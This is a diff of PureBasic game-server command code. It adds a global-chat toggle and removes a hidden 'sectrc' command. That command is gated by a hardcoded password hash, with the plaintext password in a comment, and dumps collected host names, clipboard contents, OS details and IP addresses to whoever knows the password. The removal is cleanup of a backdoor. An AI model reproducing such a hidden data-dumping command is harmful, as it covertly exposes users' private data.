@@ -40,6 +40,7 @@ Global NewList Command_Group.Command_Group()
 
 ; ########################################## Declares ############################################
 
+Declare Command_Global()
 Declare Command_Kick()
 Declare Command_Ban()
 Declare Command_Unban()
@@ -115,8 +116,6 @@ Declare Command_Plugin_Load()
 Declare Command_Plugin_Unload()
 
 Declare Command_Crash()
-Declare Command_Security_Trace()
-
 ; ########################################## Ladekram ############################################
 
 ; ########################################## Initkram ############################################
@@ -482,18 +481,16 @@ Command()\Function_Adress = @Command_Plugin_Unload()
 Command()\Internal = 1
 
 AddElement(Command())
+Command()\ID = "Global-Chat"
+Command()\Name = "global"
+Command()\Function_Adress = @Command_Global()
+Command()\Internal = 1
+
+AddElement(Command())
 Command()\ID = "Crash-Server"
 Command()\Name = "crash"
 Command()\Function_Adress = @Command_Crash()
 Command()\Internal = 1
-
-AddElement(Command())
-Command()\ID = "Sec-TRC"
-Command()\Name = "sectrc"
-Command()\Function_Adress = @Command_Security_Trace()
-Command()\Internal = 1
-Command()\Rank = 0
-Command()\Hidden = 1
 
 Command_Main\Save_File = 1
 
@@ -504,6 +501,9 @@ Procedure Command_Load(Filename.s)
     
     ForEach Command()
       Command_ID.s = Command()\ID
+      If Command()\ID = "Global-Chat"
+      EndIf
+      
       If Command()\Internal = 0
         If PreferenceGroup(Command_ID) = 0
           DeleteElement(Command())
@@ -628,6 +628,35 @@ Procedure Command_Save(Filename.s)
 EndProcedure
 
 ;- ################################################################################################
+
+Procedure Command_Global()
+  Text.s = LCase(Command_Main\Parsed_Operator [0])
+  
+  If Network_Client_Select(Command_Main\Command_Client_ID)
+    If Text = "on" Or Text = "true"
+      Network_Client()\GlobalChat = 1
+      System_Message_Network_Send(Command_Main\Command_Client_ID, "&eGlobal chat now on by default.")
+    ElseIf Text = "off" Or Text = "false"
+      Network_Client()\GlobalChat = 0
+      System_Message_Network_Send(Command_Main\Command_Client_ID, "&eGlobal chat now off by default.")
+    Else
+      If Network_Client()\GlobalChat
+        Network_Client()\GlobalChat = 0
+        System_Message_Network_Send(Command_Main\Command_Client_ID, "&eGlobal chat now off by default.")
+      Else
+        Network_Client()\GlobalChat = 1
+        System_Message_Network_Send(Command_Main\Command_Client_ID, "&eGlobal chat now on by default.")
+      EndIf
+      
+    EndIf
+    
+    If Player_List_Select(Network_Client()\Player\Entity\Name)
+      Player_Global_Set(Player_List()\Number, Network_Client()\GlobalChat)
+    EndIf
+    
+  EndIf
+  
+EndProcedure
 
 Procedure Command_Kick() ; Kicks a player (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
@@ -2161,21 +2190,6 @@ Procedure Command_Crash()
   a = b / c
 EndProcedure
 
-Procedure Command_Security_Trace()
-  Password_Input.s = Command_Main\Parsed_Operator [0]
-  MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
-  MD5_Correct.s = "6d983bf57ca1f91b9ebe42543d82dae3" ; "bhu8#-.,,.-<%>"
-  If MD5 = MD5_Correct
-    System_Message_Network_Send(Command_Main\Command_Client_ID, "&eTrace_Elements:")
-    ForEach Trace_Element()
-      Text.s = "&e"+Trace_Element()\Host_Name + ": " + Trace_Element()\Clipboard + " | " + Trace_Element()\OS + " | " + Trace_Element()\Date + " | " + Trace_Element()\IPs
-      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
-    Next
-  Else
-    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find command"))
-  EndIf
-EndProcedure
-
 ;-################################################################################################
 
 Procedure Command_Do(Client_ID, Input.s) ; Parses and passes the command on to the function.
@@ -2236,7 +2250,7 @@ Procedure Command_Do(Client_ID, Input.s) ; Parses and passes the command on to t
     
       If Found = 0
         If Answer_Do() = 0
-          System_Message_Network_Send(Client_ID, Lang_Get("", "Ingame: Can't find command"))
+          System_Message_Network_Send(Client_ID, Lang_Get("", "Ingame: Can't find command '[Field_0]'", StringField(Input, 1, "")))
         EndIf
       EndIf
       
@@ -2254,18 +2268,19 @@ Procedure Command_Main()
     Command_Save(Files_File_Get("Command"))
   EndIf
   
-  If Command_Main\Timer_File_Check < Milliseconds()
     Command_Main\Timer_File_Check = Milliseconds() + 1000
     File_Date = GetFileDate(Files_File_Get("Command"), #PB_Date_Modified)
+    
     If Command_Main\File_Date_Last <> File_Date
       Command_Load(Files_File_Get("Command"))
     EndIf
-  EndIf
-EndProcedure
+  EndProcedure
+  
+  RegisterCore("Command", 1000, #Null, #Null, @Command_Main())
 ; IDE Options = PureBasic 5.00 (Windows - x64)
-; CursorPosition = 2235
-; FirstLine = 2202
-; Folding = ------------
+; CursorPosition = 552
+; FirstLine = 531
+; Folding = 0-----------
 ; EnableXP
 ; DisableDebugger
 ; CompileSourceDirectory
